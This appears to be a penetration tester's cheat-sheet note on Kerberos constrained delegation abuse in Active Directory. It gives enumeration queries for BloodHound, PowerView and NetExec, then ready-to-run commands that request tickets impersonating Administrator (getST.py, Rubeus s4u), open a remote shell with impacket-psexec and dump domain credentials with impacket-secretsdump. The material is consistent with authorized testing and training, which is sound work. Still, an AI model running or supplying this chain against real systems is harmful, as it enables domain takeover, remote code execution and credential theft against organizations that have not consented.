---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---
## Constrained Delegation Enumeration
resources: [HackTricks Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)

> [!important] **Requirements:**
> - Control of delegating account (password or hash)
> - Target SPN in *msDS-AllowedToDelegateTo* attribute
> - Network access to target service

> [!info] Accounts with constrained delegation can impersonate any user to specific services **(SPNs) via S4U2Self/S4U2Proxy**.

> [!tip] The SPN service class can often be substituted. If delegation is to `time/target`, try `cifs/target`
### Enumeration with BloodHound
```cypher
# Users
MATCH (u:User {trustedtoauth:true}) RETURN u.name, u.allowedtodelegate

# Computers
MATCH (c:Computer {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate

# All
MATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate
```
### Enumeration with PowerView
```powershell
# Users
Get-DomainUser -TrustedToAuth

# Computers
Get-DomainComputer -TrustedToAuth
```

### Enumeration with NetExec
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation
```

### [Alternate] Find All Delegation Types
```bash
nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation
```

### [Alternate] nxc_enum
```bash
python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation
```

### [Alternate] Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation
```

## Constrained Delegation Exploitation
### Step 1: Request ticket impersonating admin to target SPN (With Password)
```bash
getST.py -spn cifs/<Target_domain_local> -impersonate Administrator <Domain>/<User>:<Pass>
```

### [Alternate] Request ticket impersonating admin to target SPN (With Hash)
```bash
getST.py -spn cifs/<Target_domain_local> -impersonate Administrator -hashes :<NTHash> <Domain>/<User>
```
### Step 2: Use the ticket
```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-psexec -k -no-pass <Target_domain_local>
```

### [Alternate] Rubeus S4U Attack
> [!tip] Request ticket impersonating admin to target SPN using **Rubeus**.

```powershell
.\Rubeus.exe s4u /user:<DelegatingUser> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:cifs/<Target_domain_local> /ptt
```

### Validate Access
```bash
nxc smb <Target_domain_local> -u Administrator -k --use-kcache
```

```bash
impacket-secretsdump -k -no-pass <Target_domain_local>
```
